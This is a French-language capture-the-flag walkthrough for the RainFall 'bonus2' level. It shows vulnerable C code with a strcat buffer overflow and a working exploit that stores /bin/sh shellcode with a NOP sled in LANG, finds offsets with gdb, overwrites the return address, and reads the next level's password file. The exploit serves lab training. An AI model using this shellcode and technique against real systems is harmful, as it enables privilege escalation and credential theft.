# Bonus 2

Voici le code source:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>

#define FI "fi"
#define NL "nl"

int language = 0;

typedef struct {
    char buff1[40];
    char buff2[36];
} user_t;

void greetuser(user_t user)
{
    char greet[72];

    if (language == 1)
        strcpy(greet, "Hyvää päivää ");
    else if (language == 2)
        strcpy(greet, "Goedemiddag! ");
    else if (language == 0)
        strcpy(greet, "Hello ");
    strcat(greet, (char*)&user);
    puts(greet);
    return;
}

int main(int ac, char **av)
{
    user_t user;
    char *lang;

    if (ac != 3)
        return 1;
    bzero(&user, 76);
    strncpy(user.buff1, av[1], 40);
    strncpy(user.buff2, av[2], 32);
    lang = getenv("LANG");
    if (lang != NULL)
    {
        if (memcmp(lang, FI, 2) == 0)
        {
            language = 1;
        }
        else if (memcmp(lang, NL, 2) == 0)
        {
            language = 2;
        }
    }
    greetuser(user);
    return 0;
}
```

Ici nous allons utiliser la variable `lang` pour y stocker un shellcode et ecraser l'adresse de retour de `greetuser()` par l'adresse de notre shellcode. Nous pouvons egalement faire un `NOP-Sled` pour securiser notre execution de shellcode. Voici donc comment exporter notre variable d'environement:

```bash
bonus2@RainFall:~$ export LANG=$(python -c 'print "nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Maintenant grace a gdb nous pouvons aller voir l'adresse de lang:

```bash
bonus2@RainFall:~$ gdb ./bonus2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.                                           (gdb) break *main+125
(gdb) break *main+125
Breakpoint 1 at 0x80485a6
(gdb) run asdf asdf
Starting program: /home/user/bonus2/bonus2 asdf asdf
Breakpoint 1, 0x080485a6 in main ()                                                                                            (gdb) x/20s *((char **)environ)                                                                                                0xbffff8a5:      "SHELL=/bin/bash"                                                                                             0xbffff8b5:      "TERM=xterm-256color"
(gdb) x/20s *((char **)environ)
0xbffff8c9:      "SSH_CLIENT=10.0.2.2 43170 4242"                                                                              0xbffff8e8:      "SSH_TTY=/dev/pts/0"
0xbffff8fb:      "USER=bonus2"
0xbffff907:      "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbffff9cf:      ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...                                0xbffffa97:      "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xbffffb5f:      ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xbffffc27:      "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...                                0xbffffcef:      ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...                                0xbffffdb7:      ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xbffffe28:      "COLUMNS=127"                                                                                                 0xbffffe34:      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"                                0xbffffe81:      "MAIL=/var/mail/bonus2"
0xbffffe97:      "_=/usr/bin/gdb"
0xbffffea6:      "PWD=/home/user/bonus2"
0xbffffebc:      "LANG=nl\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
0xbfffff3d:      "LINES=64"
0xbfffff46:      "HOME=/home/user/bonus2"
```

Il nous faut aussi l'offset a partir duquel ecrire notre nouvelle adresse:

```bash
bonus2@RainFall:~$ gdb ./bonus2
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A                                                                                                                  Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? () # Offset = 23
```

Maintenant nous pouvons construire notre payload en ajoutant un offset a l'adresse de lang (pour tomber dans notre `NOP-Sled`):

```bash
export LANG=$(python -c 'print "nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xd3\xfe\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
